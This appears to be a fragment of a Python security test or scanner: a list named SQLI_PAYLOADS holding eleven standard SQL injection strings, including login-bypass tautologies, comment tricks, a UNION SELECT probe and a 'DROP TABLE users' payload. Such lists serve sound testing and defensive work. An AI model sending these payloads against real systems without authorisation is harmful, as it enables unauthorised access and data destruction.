SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "1' OR '1'='1",
    "admin' --",
    "admin' #",
    "1; DROP TABLE users",
    "1' AND 1=0 UNION ALL SELECT NULL, NULL, NULL--",
    "' OR 'a'='a",
    "') OR ('a'='a",
    '" OR "a"="a',
    "1 OR 1=1",
]
